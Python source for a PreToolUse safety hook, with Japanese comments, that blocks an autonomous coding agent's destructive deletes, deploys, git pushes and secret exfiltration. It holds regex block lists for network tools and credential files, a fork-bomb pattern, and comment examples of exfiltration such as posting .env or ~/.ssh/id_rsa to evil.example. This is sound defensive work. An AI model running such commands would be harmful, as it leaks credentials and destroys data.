#!/usr/bin/env python3
# ============================================================================
# core/safety/guard.py — night-runner デフォルト安全境界（PreToolUse フック）
# ============================================================================
#
# claude の「外側」で危険操作を物理ブロックする層。
# `--dangerously-skip-permissions` で走っていても PreToolUse フックは発火し、
# permissionDecision:"deny" でツール実行を止められることを実機検証済み。
# → プロンプトインジェクションでプロンプトの指示が無視されても、この層は無効化されない。
#
# 止めるのは「誰の環境でも致命傷になる」4カテゴリ **だけ**（広げない＝完走性を殺さない）:
#   1. 破壊的削除（作業ディレクトリ外への rm -rf / dd / mkfs / diskutil 等）
#   2. 課金が発生する操作（クラウドのプロビジョニング/デプロイ）
#   3. 本番への push / deploy / 不可逆な外部送信
#   4. 認証情報・秘密情報の外部送信
# 上記以外は止めない。libe 固有（DB スキーマ等）は入れない。
#
# 契約: stdin に PreToolUse の JSON。deny する時は stdout に
#   {"hookSpecificOutput":{"hookEventName":"PreToolUse",
#     "permissionDecision":"deny","permissionDecisionReason":"..."}}
# を出して exit 0。許可は「何も出さず exit 0」。
# ============================================================================

import sys, os, json, re

SENDERS = r'\b(curl|wget|nc|ncat|netcat|scp|sftp|rsync|ftp|telnet|sendmail|mail)\b'
SECRETS = (r'(\.env\b|\.ssh/|id_rsa|id_ed25519|id_ecdsa|\.pem\b|\.p12\b|\.netrc'
           r'|credentials\b|secret|token|password|passwd|api[_-]?key|access[_-]?key'
           r'|private[_-]?key|AWS_SECRET|AWS_ACCESS_KEY|keychain)')

# SECRET_FILES = 「秘密の“ファイル”を参照している」ことを示す指標（SECRETS の部分集合）。
# token/password/secret/api_key 等の“語”は除外している点が重要:
#   - `-H "X-ChatWorkToken: $CHATWORK_API_TOKEN"` のような認証ヘッダは SECRET_FILES に当たらない
#     （正規のAPI認証であり、サンクション済み送信先になら通してよい）。
#   - 一方 `.ssh/id_rsa` `.env` `credentials` 等の“ファイル”は、宛先がサンクション済みでも
#     送出させない（秘密ファイルの中身を外へ出す経路を塞ぐ）。
SECRET_FILES = (r'(\.env\b|\.ssh/|id_rsa|id_ed25519|id_ecdsa|\.pem\b|\.p12\b|\.netrc'
                r'|credentials\b|private[_-]?key|AWS_SECRET|AWS_ACCESS_KEY|keychain)')

CATASTROPHIC = [
    (r'\bmkfs(\.\w+)?\b', 'ファイルシステム作成(mkfs)'),
    (r'\bdd\b[^\n;|&]*\bof=/dev/', 'ディスクへの dd 書き込み'),
    (r'\bdiskutil\s+(erase|reformat|partitiondisk|zerodisk)', 'diskutil ディスク消去'),
    (r'>\s*/dev/(r?disk|sd)', 'デバイスへの直接書き込み'),
    (r'\bshred\b', 'shred によるファイル抹消'),
    (r':\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:', 'フォークボム'),
]

PUSH_DEPLOY = [
    (r'\bgit\s+push\b.*(--force\b|--force-with-lease\b|\s-f\b)', 'git 強制 push'),
    (r'\bgit\s+push\b', 'git push（外部・不可逆）'),
    (r'\bgh\s+pr\s+merge\b', 'PR マージ'),
    (r'\bgh\s+release\b', 'GitHub リリース'),
    (r'\b(npm|yarn|pnpm)\s+publish\b', 'パッケージ publish'),
    (r'\b(npm|yarn|pnpm)\s+run\s+deploy\b', 'run deploy'),
    (r'\bfirebase\s+deploy\b', 'firebase deploy'),
    (r'\bvercel\b.*(--prod\b|\bdeploy\b)', 'vercel deploy'),
    (r'\bnetlify\b.*\bdeploy\b', 'netlify deploy'),
    (r'\b(serverless|sls)\s+deploy\b', 'serverless deploy'),
    (r'\bfly(ctl)?\s+deploy\b', 'fly deploy'),
    (r'\beb\s+deploy\b', 'Elastic Beanstalk deploy'),
    (r'\bterraform\s+(apply|destroy)\b', 'terraform apply/destroy'),
    (r'\bkubectl\s+(apply|delete|replace|create|patch)\b', 'kubectl 変更操作'),
    (r'\bgcloud\b.*\b(deploy|create)\b', 'gcloud デプロイ/作成（課金）'),
    (r'\baws\b.*(\bdeploy\b|\bcreate-|\brun-instances\b|s3\s+sync)', 'aws デプロイ/作成（課金）'),
    (r'\baz\b.*\b(create|deploy)\b', 'az 作成/デプロイ（課金）'),
    (r'\bheroku\b.*\b(deploy|run)\b', 'heroku deploy'),
    (r'\bcap\b.*\bdeploy\b', 'capistrano deploy'),
    (r'\bdocker\s+push\b', 'docker push（レジストリ送信）'),
]

DANGER_MCP = [
    (r'merge_pull_request', 'PR マージ'),
    (r'push_files', 'リモートへの push'),
    (r'create_or_update_file', 'リモートリポジトリへの書き込み'),
    (r'create_release', 'リリース作成'),
    (r'deploy', 'デプロイ'),
]


def deny(reason):
    print(json.dumps({"hookSpecificOutput": {
        "hookEventName": "PreToolUse",
        "permissionDecision": "deny",
        "permissionDecisionReason": "[night-runner safety] " + reason}}))
    _log(reason)
    sys.exit(0)


def allow():
    sys.exit(0)  # 出力なし＝通常フロー（許可）


def _log(reason):
    runs = os.environ.get("NR_RUNS_DIR")
    if not runs:
        return
    try:
        import datetime
        with open(os.path.join(runs, "safety.log"), "a") as f:
            f.write("%s DENY %s\n" % (datetime.datetime.now().isoformat(timespec="seconds"), reason))
    except Exception:
        pass


def is_dangerous_target(t, root):
    t0 = t.strip().strip('"').strip("'")
    if t0 in ('/', '~', '~/', '*', '.', './', '..', '$HOME', '${HOME}'):
        return True
    if t0.startswith('~') or t0.startswith('$HOME') or t0.startswith('${HOME}'):
        return True
    if '..' in t0.split('/'):
        return True
    if t0.startswith('/'):
        rp = os.path.realpath(t0)
        return not (rp == root or rp.startswith(root + os.sep))
    rp = os.path.realpath(os.path.join(root, t0))
    if rp == root:          # 作業ディレクトリ自体を丸ごと削除
        return True
    return not rp.startswith(root + os.sep)


def check_rm(cmd, root):
    import shlex
    for seg in re.split(r'(?:&&|\|\||;|\n|\|)', cmd):
        try:
            argv = shlex.split(seg)
        except Exception:
            argv = seg.split()
        i = 0
        # 先頭の sudo / VAR=val を読み飛ばす
        while i < len(argv) and (argv[i] == 'sudo' or re.match(r'^[A-Za-z_]\w*=', argv[i])):
            i += 1
        if i >= len(argv) or os.path.basename(argv[i]) != 'rm':
            continue
        rest = argv[i + 1:]
        short = ''.join(a[1:] for a in rest if a.startswith('-') and not a.startswith('--'))
        longs = [a for a in rest if a.startswith('--')]
        recursive = ('r' in short) or ('R' in short) or ('--recursive' in longs)
        force = ('f' in short) or ('--force' in longs)
        if not (recursive and force):
            continue
        targets = [a for a in rest if not a.startswith('-')]
        if not targets:           # rm -rf （対象未指定でも危険寄り）
            continue
        for t in targets:
            if is_dangerous_target(t, root):
                deny("作業ディレクトリ外/危険な再帰削除: rm ... %s" % t)


# ============================================================================
# サンクション済み送信先 allowlist（意図した外部送信だけ通す / 汎用機構）
# ============================================================================
# 目的: Chatwork 投稿のような「意図した外部送信」を1つだけ通したい。だが
# 「外部送信を全部許可」は絶対にしない。許可は次の "2条件 AND" を満たす時だけ:
#
#   条件1: コマンド中の **全ての URL** が NR_ALLOWED_SEND_URLS のいずれかの
#          正規表現に一致する（1つでも別宛先が混じれば不許可）。
#   条件2: コマンドが **秘密ファイル**（SECRET_FILES: .ssh/ id_rsa .env
#          credentials .pem 等）を参照していない（認証トークンの“ヘッダ”はOK、
#          秘密ファイルの“中身”の送出はNG）。
#
# そして allowlist が緩めるのは「秘密の外部送信(SENDERS+SECRETS)」ルール **だけ**。
# 破壊的削除・push/deploy・Keychain 取り出し・WebFetch 等は従来どおり止まる。
#
# 例: NR_ALLOWED_SEND_URLS = ^https://api\.chatwork\.com/v2/rooms/[^/?#]+/messages$
#
#   通す (ALLOW):
#     curl -X POST -H "X-ChatWorkToken: $CHATWORK_API_TOKEN" \
#          -d "body=..." https://api.chatwork.com/v2/rooms/123/messages
#       → 全URLが一致(条件1) かつ 秘密ファイル参照なし(条件2)。トークンは認証ヘッダ。
#
#   弾く (DENY、いずれも従来の秘密送信ルールに戻る/別ルールで停止):
#     ・別宛先:   curl ... https://evil.example/collect              （条件1で不一致）
#     ・2宛先混在: curl ...chatwork.../messages; curl ...evil...      （条件1で不一致）
#     ・秘密送出: curl -d @.env ...chatwork.../messages              （条件2で .env 参照）
#                curl -d "x=$(cat ~/.ssh/id_rsa)" ...chatwork.../messages（条件2で id_rsa）
#     ・別ルール: git push / rm -rf ~ / security find-generic-password（allowlistは無関係に停止）
#
# 正規表現の堅さ: URL は fullmatch（全体一致）で判定するため、
#   `.../messages/../../evil` のような「許可プレフィックス＋別パス」は弾かれる。
#   [^/?#]+ で room セグメントを1階層に縛り、host も api\.chatwork\.com で固定。
def _allowed_send_patterns():
    raw = os.environ.get("NR_ALLOWED_SEND_URLS", "") or ""
    pats = []
    for tok in re.split(r'[\s,]+', raw.strip()):
        if not tok:
            continue
        try:
            pats.append(re.compile(tok))
        except re.error:
            # 不正な正規表現は無視（=その分は許可しない＝安全側）
            pass
    return pats


def is_sanctioned_send(cmd):
    pats = _allowed_send_patterns()
    if not pats:
        return False
    urls = re.findall(r'https?://[^\s"\'<>|;&)]+', cmd)
    if not urls:
        return False
    # 条件1: 全URLが一致。fullmatch（URL 全体一致）にすることで、
    # `.../messages/../../me` のような「許可プレフィックス＋別パス」での前方一致回避を塞ぐ。
    # ユーザの正規表現が末尾 $ を付け忘れても、fullmatch がURL末尾まで一致を強制する。
    for u in urls:
        if not any(p.fullmatch(u) for p in pats):
            return False
    if re.search(SECRET_FILES, cmd, re.I):           # 条件2: 秘密ファイル不参照
        return False
    return True


def check_bash(cmd, root):
    for pat, label in CATASTROPHIC:
        if re.search(pat, cmd, re.I):
            deny("破壊的操作: " + label)
    check_rm(cmd, root)
    for pat, label in PUSH_DEPLOY:
        if re.search(pat, cmd, re.I):
            deny("本番/デプロイ/不可逆送信: " + label)
    # 秘密の外部送信。ただしサンクション済み送信先(2条件)なら通す。
    if re.search(SENDERS, cmd, re.I) and re.search(SECRETS, cmd, re.I):
        if not is_sanctioned_send(cmd):
            deny("秘密情報の外部送信の疑い（ネットワーク送信＋秘密参照）")
    if re.search(r'\bsecurity\s+(find-generic-password|find-internet-password|dump-keychain)', cmd, re.I):
        deny("Keychain からの秘密取り出し")


def check_mcp(tool):
    for pat, label in DANGER_MCP:
        if re.search(pat, tool, re.I):
            deny("MCP 外部不可逆操作: %s（%s）" % (tool, label))


def check_webfetch(ti):
    blob = json.dumps(ti)
    if re.search(SECRETS, blob, re.I) and re.search(r'https?://', blob, re.I):
        deny("WebFetch リクエストに秘密情報が含まれる疑い")


def main():
    raw = sys.stdin.read()
    try:
        data = json.loads(raw)
    except Exception:
        # 入力が解釈できない＝判定不能 → fail-closed（安全側で拒否）
        deny("ツール入力を解釈できなかったため安全側で拒否")
        return
    tool = data.get("tool_name", "") or ""
    ti = data.get("tool_input", {}) or {}
    root = os.environ.get("NR_ROOT") or os.environ.get("CLAUDE_PROJECT_DIR") or os.getcwd()
    root = os.path.realpath(root)

    if tool == "Bash":
        check_bash(ti.get("command", "") or "", root)
    elif tool.startswith("mcp__"):
        check_mcp(tool)
    elif tool == "WebFetch":
        check_webfetch(ti)
    allow()


if __name__ == "__main__":
    main()
